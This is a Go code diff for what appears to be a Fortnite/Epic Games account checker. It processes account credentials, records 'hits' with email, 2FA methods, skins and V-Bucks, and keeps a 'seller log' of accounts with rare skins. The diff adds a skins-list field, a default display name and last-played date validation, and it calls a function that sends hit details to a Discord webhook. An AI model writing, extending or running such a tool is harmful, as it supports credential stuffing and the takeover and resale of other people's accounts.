@@ -312,6 +312,9 @@ func (s *Stats) ExportRetries(acc string, respText string, incrementRetries bool
 }
 
 func (s *Stats) ExportSkins(acc, displayName string, skinCount int, skinsList, epicEmail, twofaStatus, psn, nintendo, emailVerified, vbucksCount, alternateMethods, lastPlayed string, isMaybeFa, hasStw bool) {
+	if strings.TrimSpace(displayName) == "" {
+		displayName = "Unknown"
+	}
 	folderID := s.getSessionFolder()
 	AddToCheck(1)
 	DecrementJobs(1)
@@ -679,7 +682,10 @@ func sendDiscordWebhookForHit(acc, displayName, skinsCountStr, epicEmail, altern
 	}
 }
 
-func (s *Stats) ExportExclusive(acc, displayName string, skinCount int, epicEmail, alternateMethods, lastPlayed string, totalVbucks int, hasStw bool) {
+func (s *Stats) ExportExclusive(acc, displayName string, skinCount int, skinsList, epicEmail, alternateMethods, lastPlayed string, totalVbucks int, hasStw bool) {
+	if strings.TrimSpace(displayName) == "" {
+		displayName = "Unknown"
+	}
 	folderID := s.getSessionFolder()
 	filePath := filepath.Join("Results", folderID, "exclusives.txt")
 
@@ -689,8 +695,8 @@ func (s *Stats) ExportExclusive(acc, displayName string, skinCount int, epicEmai
 	}
 	defer f.Close()
 
-	line := fmt.Sprintf("Account: %s | Display Name: %s | Skins: %d | V-Bucks: %d | Epic Email: %s | 2FA Methods: %s | STW: %t | Last Played: %s\n",
-		acc, displayName, skinCount, totalVbucks, epicEmail, alternateMethods, hasStw, lastPlayed)
+	line := fmt.Sprintf("Account: %s | Display Name: %s | Skins: %d | Skins List: %s | Epic Email: %s | 2FA Methods: %s | STW: %t | Last Played: %s\n",
+		acc, displayName, skinCount, skinsList, epicEmail, alternateMethods, hasStw, lastPlayed)
 	_, _ = f.WriteString(line)
 
 	// Send Discord webhook for exclusive hits
@@ -734,7 +740,7 @@ func (s *Stats) ExportFA(acc, displayName string, skinCount, totalVbucks int, ep
 	_, _ = f.WriteString(line)
 }
 
-func (s *Stats) ExportHit(acc, displayName, epicEmail, alternateMethodsStr, lastPlayed, twofaStatus string, skinCount, totalVbucks int, hasStw, isHeadless bool, ogSkinsFound, rareSkinsFound []string) {
+func (s *Stats) ExportHit(acc, displayName, epicEmail, alternateMethodsStr, lastPlayed, twofaStatus, skinsList string, skinCount, totalVbucks int, hasStw, isHeadless bool, ogSkinsFound, rareSkinsFound []string) {
 	// Send Discord webhook for ALL hits if enabled (including exclusives, headless, etc.)
 	if SendAllHits && DiscordWebhookURL != "" {
 		sendDiscordWebhookForHit(acc, displayName, fmt.Sprintf("%d Skins", skinCount), epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw, twofaStatus)
@@ -742,7 +748,7 @@ func (s *Stats) ExportHit(acc, displayName, epicEmail, alternateMethodsStr, last
 
 	// Export exclusive accounts to separate file
 	if len(ogSkinsFound) > 0 {
-		s.ExportExclusive(acc, displayName, skinCount, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
+		s.ExportExclusive(acc, displayName, skinCount, skinsList, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
 		sellerLogEntry := fmt.Sprintf("%s | Epic Email: %s | OG Skins: %s | Skin Count: %d | V-Bucks: %d | 2FA Methods: %s | STW: %t | Last Played: %s",
 			acc, epicEmail, strings.Join(ogSkinsFound, ", "), skinCount, totalVbucks, alternateMethodsStr, hasStw, lastPlayed)
 		s.raresAndExclusivesSellerLog = append(s.raresAndExclusivesSellerLog, sellerLogEntry)
@@ -750,7 +756,7 @@ func (s *Stats) ExportHit(acc, displayName, epicEmail, alternateMethodsStr, last
 	}
 
 	if len(rareSkinsFound) > 0 {
-		s.ExportExclusive(acc, displayName, skinCount, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
+		s.ExportExclusive(acc, displayName, skinCount, skinsList, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
 		sellerLogEntry := fmt.Sprintf("Epic Email: %s | Exclusive Skins: %s | Skin Count: %d | V-Bucks: %d | 2FA Methods: %s | STW: %t | Last Played: %s",
 			epicEmail, strings.Join(rareSkinsFound, ", "), skinCount, totalVbucks, alternateMethodsStr, hasStw, lastPlayed)
 		s.raresAndExclusivesSellerLog = append(s.raresAndExclusivesSellerLog, acc+" | "+sellerLogEntry)
@@ -1563,6 +1569,14 @@ func CheckAccount(acc string) bool {
 									} else {
 										lastPlayed = lastMatch
 									}
+									// Validate date
+									if parsed, err := time.Parse("2006-01-02", lastPlayed); err == nil {
+										if parsed.After(time.Now()) {
+											lastPlayed = "N/A"
+										}
+									} else {
+										lastPlayed = "N/A"
+									}
 								}
 							}
 						}
@@ -1664,7 +1678,7 @@ func CheckAccount(acc string) bool {
 	ExportLock.Lock()
 	AddToHits(1)
 
-	GetStats().ExportHit(acc, displayName, epicEmail, tfaMethod, lastPlayed, tfaEnabled, skinCount, totalVbucks, hasStw, CurrentAccountHeadless, ogSkinsFound, rareSkinsFound)
+	GetStats().ExportHit(acc, displayName, epicEmail, tfaMethod, lastPlayed, tfaEnabled, skinsList, skinCount, totalVbucks, hasStw, CurrentAccountHeadless, ogSkinsFound, rareSkinsFound)
 
 	if isFA {
 		GetStats().ExportFA(acc, displayName, skinCount, totalVbucks, epicEmail, tfaMethod, hasStw, lastPlayed)
